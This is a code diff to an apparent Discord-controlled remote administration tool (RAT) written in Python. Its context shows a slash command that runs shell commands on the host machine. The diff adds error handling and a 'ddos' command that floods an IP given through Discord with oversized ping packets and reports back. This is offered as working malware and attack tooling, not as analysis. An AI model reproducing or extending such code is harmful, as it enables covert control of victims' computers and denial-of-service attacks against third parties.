@@ -1,4 +1,5 @@
-import discord, os, pyautogui, requests, cv2, numpy, subprocess
+from concurrent.futures import thread
+import discord, os, pyautogui, requests, cv2, numpy, subprocess, threading
 from config import *
 
 client = discord.Bot(intents=discord.Intents.all())
@@ -81,6 +82,25 @@ async def shell(ctx, command):
             embed = discord.Embed(title="Command Executed", description=f"```{list}```", color=0x660cf)
             await ctx.respond(embed=embed)
             os.remove(f"{os.getenv('TEMP')}\\shell.txt")
+        except Exception as error:
+            embed = discord.Embed(title="Something went wrong", description=f"```{error}```", color=0x660cf)
+            await ctx.respond(embed=embed)
+
+@client.slash_command(name="ddos", guild_ids=guildid)
+async def ddos(ctx, ip, threads, requests):
+    if ctx.channel.id == channel.id:
+        try:
+            embed = discord.Embed(title="Attack Started", description=f"```Requests: {requests}\nThreads: {threads}```", color=0x660cf)
+            await ctx.respond(embed=embed)
+            for i in range(int(threads)): thread = threading.Thread(); thread.start()
+            for i in range(int(requests)):
+                subprocess.check_output(f"ping {ip} -l 65500 -w 1 -n 1")
+            for i in range(int(threads)): thread.join()
+            os.system(f"ping {ip} > {os.getenv('TEMP')}\\log.txt")
+            log = open(f"{os.getenv('TEMP')}\\log.txt", "r").read()
+            embed = discord.Embed(title="Attack Stopped", description=f"```{log}```", color=0x660cf)
+            await ctx.respond(embed=embed)
+            os.remove(f"{os.getenv('TEMP')}\\log.txt")
         except Exception as error:
             embed = discord.Embed(title="Something went wrong", description=f"```{error}```", color=0x660cf)
             await ctx.respond(embed=embed)
